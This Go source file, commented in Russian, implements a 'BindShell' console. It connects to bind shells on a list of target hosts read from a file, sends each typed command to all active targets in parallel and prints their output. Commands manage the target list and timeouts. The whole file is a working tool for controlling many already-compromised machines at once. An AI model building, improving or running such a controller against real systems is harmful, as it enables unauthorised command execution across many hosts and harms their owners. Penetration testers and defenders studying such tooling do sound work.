package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

// Структура цели
type Target struct {
	name   string
	conn   net.Conn
	status bool
}

var global_response_timeout int = 1000
var active_targets int = 0

// Предоставляет список встроенных команд (вызов: /BS help).
func BindShellHelp() {
	fmt.Println("[BindShell] Command list:")
	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip>:<port> to set;")
	fmt.Println("\t- /BS help \t\t\tShow this list;")
	fmt.Println("\t- /BS off <index> \t\tStop sending commands to the host;")
	fmt.Println("\t- /BS on <index> \t\tResume sending commands to the host;")
	fmt.Println("\t- /BS remove <index> \t\tRemove target from set;")
	fmt.Println("\t- /BS scenario <scenario> \tStart scenario from file <scenario>; (TODO)")
	fmt.Println("\t- /BS stop \t\t\tFinish session;")
	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
	fmt.Println("\t- /BS timeout <time> \t\tSet targets response timeout to <time> milliseconds;")
}

// Завершает работу программы (вызов: /BS stop)
func BindShellStop(targets *[]Target) {
	// Завершение всех активных соединений
	finishAllSessions(targets)

	// Завершение программы
	fmt.Println("[BindShell] Shutdown...")
	os.Exit(0)
}

// Выводит список целевых хостов (вызов: /BS targets)
func BindShellTargets(targets *[]Target) {
	fmt.Println("[BindShell] Current targets:")
	for i := 0; i < len(*targets); i++ {
		if (*targets)[i].status == true {
			fmt.Printf("\t<%d> [+] %s\n", i, (*targets)[i].name)
		} else {
			fmt.Printf("\t<%d> [-] %s\n", i, (*targets)[i].name)
		}
	}
}

// Удаляет выбранный хост из списка целей и завершает с ним сессию (вызов: /BS remove)
func BindShellRemove(targets *[]Target, idx int) {
	active_targets--

	// Завершение сессии удаляемого хоста
	finishSession((*targets)[idx])

	fmt.Printf("[BindShell] %s << Host removed from target list.\n", (*targets)[idx].name)

	// Удаление хоста из списка целей
	*targets = append((*targets)[:idx], (*targets)[idx+1:]...)
}

// Приостановление взаимодействия с целью (вызов: /BS off)
func BindShellOff(targets *[]Target, idx int) {
	active_targets--
	(*targets)[idx].status = false
	fmt.Printf("[BindShell] %s off.\n", (*targets)[idx].name)
}

// Возобновление взаимодействия с целью (вызов: /BS on)
func BindShellOn(targets *[]Target, idx int) {
	active_targets++
	(*targets)[idx].status = true
	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
}

// Устанавливает значение переменной response_timeout равным value (вызов: /BS timeout)
func BindShellTimeout(value int) {
	global_response_timeout = value
	fmt.Printf("[BindShell] Response timeout set to %d millisecond(s).\n", global_response_timeout)
}

// Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
func BindShellAdd(targets *[]Target, target_name string) {
	active_targets++
	addSession(targets, target_name)
}

func addSession(targets *[]Target, target_name string) {
	// Установка соединения с целевым хостом
	conn, err := net.Dial("tcp", target_name)
	if err != nil {
		log.Fatalln(err)
	} else {
		fmt.Printf("[BindShell] %s << Connection successfully established.\n", target_name)
	}

	// Добавление хоста в список целей
	*targets = append(*targets, Target{name: target_name, conn: conn, status: true})
}

func finishSession(target Target) {
	if target.conn.Close() == nil {
		fmt.Printf("[BindShell] %s << Connection successfully terminated.\n", target.name)
	}
}

func finishAllSessions(targets *[]Target) {
	for i := 0; i < len(*targets); i++ {
		finishSession((*targets)[i])
	}
}

func checkTargetNumber(targets *[]Target, input string) (bool, int) {
	idx, err := strconv.Atoi(input)
	if err != nil {
		fmt.Println("[BindShell] The index is an invalid number!")
		return false, 0
	} else if idx >= len(*targets) || idx < 0 {
		fmt.Println("[BindShell] The index is out of bounds!")
		return false, 0
	} else {
		return true, idx
	}
}

func checkTimeoutAndWaiting(input string) (bool, int) {
	value, err := strconv.Atoi(input)
	if err != nil {
		fmt.Println("[BindShell] The value is an invalid number!")
		return false, 0
	} else if value < 0 {
		fmt.Println("[BindShell] The value lower then zero!")
		return false, 0
	} else {
		return true, value
	}
}

func BindShellLoadTargets(targets *[]Target, targets_file string) {
	active_targets = 0

	// Завершение всех активных соединений
	finishAllSessions(targets)

	// Очистка списка целей
	*targets = []Target{}

	// Открытие файла с новыми целями
	file, err := os.Open(targets_file)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	// Создание сканера для считывания
	scanner := bufio.NewScanner(file)

	// Построчное считывание файла
	for scanner.Scan() {
		// Получение имени хоста
		target_name := scanner.Text()

		// Добавление сессии
		addSession(targets, target_name)

		active_targets++
	}
}

func BindShellRequest(request []string, targets *[]Target) {
	switch request[1] {
	case "add":
		BindShellAdd(targets, request[2])
	case "help":
		BindShellHelp()
	case "off":
		ok, idx := checkTargetNumber(targets, request[2])
		if ok {
			BindShellOff(targets, idx)
		}
	case "on":
		ok, idx := checkTargetNumber(targets, request[2])
		if ok {
			BindShellOn(targets, idx)
		}
	case "remove":
		ok, idx := checkTargetNumber(targets, request[2])
		if ok {
			BindShellRemove(targets, idx)
		}
	case "stop":
		BindShellStop(targets)
	case "targets":
		BindShellTargets(targets)
	case "timeout":
		ok, value := checkTimeoutAndWaiting(request[2])
		if ok {
			BindShellTimeout(value)
		}
	}
}

func sendCommand(target Target, input string, ch_resp chan string) {
	// Отправка команды на целевой хост
	_, err := target.conn.Write([]byte(input + "\n"))
	if err != nil {
		log.Fatalln(err)
	}

	// Установка дедлайна для чтения ответа
	if err := target.conn.SetReadDeadline(time.Now().Add(time.Duration(global_response_timeout) * time.Millisecond)); err != nil {
		ch_resp <- fmt.Sprintf("Error setting read deadline for %s: %v", target.name, err)
		log.Fatalln(err)
	}

	// Чтение ответа
	buffer := make([]byte, 1024)
	n, err := target.conn.Read(buffer)
	if err != nil {
		ch_resp <- ""
		return
	}

	// Отправка ответа в канал
	ch_resp <- fmt.Sprintf("Response from %s:\n%s", target.name, string(buffer[:n]))
}

func main() {
	// Инициализация контейнера целей
	targets := make([]Target, 0, 1)

	// Считывание целей из файла
	BindShellLoadTargets(&targets, os.Args[1])

	// Создание объекта NewReader стандартного потока ввода
	reader := bufio.NewReader(os.Stdin)

	// Инструктаж пользователя
	fmt.Printf("[BindShell] Print \"/BS help\" to get info.\n")
	for {
		// Приглашение к вводу команды
		fmt.Print("[BindShell] >> ")

		// Считывание команды пользователя
		input, _ := reader.ReadString('\n')

		// Обработка пустого ввода
		if len(input) <= 2 {
			continue
		}

		// Удаление лишних символов
		input = strings.TrimSpace(input)

		// Разбиение команды на аргументы
		splitted_input := strings.Fields(input)

		// Проверка типа команды
		if splitted_input[0] == "/BS" {
			// Выполнение встроенной команды BindShell
			BindShellRequest(splitted_input, &targets)
		} else {
			// Создание канала для получения результатов команд
			ch_resp := make(chan string)

			// Выполнение команды для каждого активного хоста
			for i := 0; i < len(targets); i++ {
				if targets[i].status == true {
					// Отправка команды на целевой хост
					go sendCommand(targets[i], input, ch_resp)
				}
			}

			for i := 0; i < active_targets; i++ {
				//select {
				response := <-ch_resp
				if len(response) > 0 {
					fmt.Println(response)
				}
				//case <-time.After(time.Duration(global_response_waiting) * time.Millisecond):
				//	fmt.Println("Timeout waiting for response")
				//}
			}
		}
	}
}
